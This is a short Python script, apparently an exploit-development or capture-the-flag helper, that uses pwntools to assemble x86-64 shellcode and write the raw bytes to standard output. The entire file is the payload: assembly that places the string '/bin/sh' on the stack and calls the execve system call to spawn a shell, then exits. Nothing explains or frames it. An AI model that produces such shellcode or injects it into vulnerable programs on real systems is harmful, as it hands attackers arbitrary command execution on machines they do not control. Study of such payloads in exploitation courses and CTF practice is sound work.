from pwn import *

import sys
write = sys.stdout.buffer.write

context.arch = 'amd64'

buf = asm('''
global _start

section .text:

_start:
        call main
        db '/bin/sh', 00

main:
        xor rax, rax
        xor rdi, rdi
        xor rdx, rdx
        xor rcx, rcx
        mov rax, 0x3b /* rax = execve */
        mov rdi, [rsp] /* file_name */
        mov rsi, 0 /* argv */
        mov rdx, 0 /* env */
        syscall
        mov rax, 60 /* rax = sys_exit */
        mov rdi, 0
        syscall
''')

write(buf)
